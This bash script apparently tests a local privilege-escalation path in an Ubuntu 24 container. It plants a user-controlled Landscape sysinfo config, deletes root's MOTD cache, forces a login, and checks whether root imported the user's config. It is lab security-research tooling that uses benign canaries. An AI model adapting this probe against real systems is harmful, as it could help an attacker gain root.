#!/usr/bin/env bash
set -euo pipefail

container="${1:-ubuntu24-server-lpe-target}"
repo_dir="$(cd "$(dirname "${BASH_SOURCE[0]}")/.." && pwd)"
log_path="$repo_dir/logs/pam-motd-landscape-ruid.out"
tmp_log="$(mktemp "$repo_dir/logs/pam-motd-landscape-ruid.out.tmp.XXXXXX")"

docker exec -i "$container" bash -s >"$tmp_log" 2>&1 <<'TARGET'
set -Eeuo pipefail

name=pam-motd-landscape-ruid
work="/tmp/$name"
user=selfauth
home="/home/$user"
root_marker="/root/${name}-root"

cleanup() {
  set +e
  loginctl terminate-user "$user" >/dev/null 2>&1 || true
  systemctl start getty@tty1.service >/dev/null 2>&1 || true
  rm -rf "$work" "$root_marker" "$home/.landscape" "$home/.bash_profile"
  systemctl reset-failed getty@tty1.service >/dev/null 2>&1 || true
}
trap cleanup EXIT

rm -rf "$work" "$root_marker" "$home/.landscape" "$home/.bash_profile"
mkdir -p "$work" "$home/.landscape"
chmod 0755 "$work"

id "$user" >/dev/null 2>&1 || useradd -m -s /bin/bash "$user"
echo "$user:$user" | chpasswd
usermod -G "$user" "$user"

cat >"$home/.landscape/sysinfo.conf" <<'EOF'
[sysinfo]
sysinfo-plugins = TestPlugin
width = 80
EOF

cat >"$home/.bash_profile" <<'EOF'
#!/bin/sh
set +e
id > /tmp/pam-motd-landscape-ruid/login-id.txt
printf 'HOME=%s USER=%s LOGNAME=%s\n' "$HOME" "$USER" "$LOGNAME" > /tmp/pam-motd-landscape-ruid/login-env.txt
cp /var/lib/landscape/landscape-sysinfo.cache /tmp/pam-motd-landscape-ruid/cache-after.txt 2>/tmp/pam-motd-landscape-ruid/cache-cp.err || true
cp /home/selfauth/.landscape/sysinfo.log /tmp/pam-motd-landscape-ruid/user-sysinfo.log 2>/tmp/pam-motd-landscape-ruid/user-log.err || true
test -e /root/pam-motd-landscape-ruid-root && echo ROOT_MARKER_VISIBLE > /tmp/pam-motd-landscape-ruid/root-visible.txt
sleep 1
exit 0
EOF

chown -R "$user:$user" "$home/.landscape" "$home/.bash_profile" "$work"
chmod 0755 "$home/.bash_profile"

{
  echo "## target proof"
  sed -n '1,8p' /etc/os-release
  uname -a
  id attacker 2>&1 || true
  id "$user"
  dpkg-query -W -f='${binary:Package}\t${Version}\t${db:Status-Abbrev}\n' \
    login libpam-modules landscape-common python3-twisted systemd 2>&1 | sort
  echo

  echo "## code/config anchors"
  nl -ba /etc/pam.d/login | sed -n '27,36p'
  echo
  nl -ba /etc/update-motd.d/50-landscape-sysinfo | sed -n '1,34p'
  echo
  nl -ba /usr/lib/python3/dist-packages/landscape/sysinfo/deployment.py | sed -n '29,39p;83,98p;101,110p'
  echo

  echo "## user-controlled sysinfo canary"
  stat -c '%A %U:%G %n' "$home/.landscape" "$home/.landscape/sysinfo.conf" "$home/.bash_profile"
  sed -n '1,20p' "$home/.landscape/sysinfo.conf"
  echo

  echo "## force stale/missing root MOTD cache and perform real login"
  rm -f /var/lib/landscape/landscape-sysinfo.cache
  systemctl stop getty@tty1.service >/dev/null 2>&1 || true
  openvt -c 1 -s -f -w -- /bin/login -f "$user" > "$work/openvt.out" 2>&1 || true
  systemctl start getty@tty1.service >/dev/null 2>&1 || true
  sed -n '1,120p' "$work/openvt.out" || true
  echo

  echo "## login shell proof"
  cat "$work/login-id.txt" 2>&1 || true
  cat "$work/login-env.txt" 2>&1 || true
  echo

  echo "## landscape root cache result"
  stat -c '%A %U:%G %s %n' /var/lib/landscape/landscape-sysinfo.cache "$work/cache-after.txt" 2>&1 || true
  sed -n '1,80p' "$work/cache-after.txt" 2>&1 || true
  if grep -q 'Test header' "$work/cache-after.txt" 2>/dev/null; then
    echo "USER_CONFIG_IMPORTED=YES"
  else
    echo "USER_CONFIG_IMPORTED=NO"
  fi
  echo

  echo "## user log and root marker checks"
  find "$work" "$home/.landscape" -maxdepth 2 -type f -printf '%M %u:%g %p\n' | sort
  sed -n '1,80p' "$work/user-sysinfo.log" 2>&1 || true
  test -e "$root_marker" && echo "ROOT_PROOF=YES" || echo "ROOT_PROOF=NO"
  ls -l "$root_marker" "$work/root-visible.txt" 2>&1 || true
} 
TARGET

mv "$tmp_log" "$log_path"
cat "$log_path"
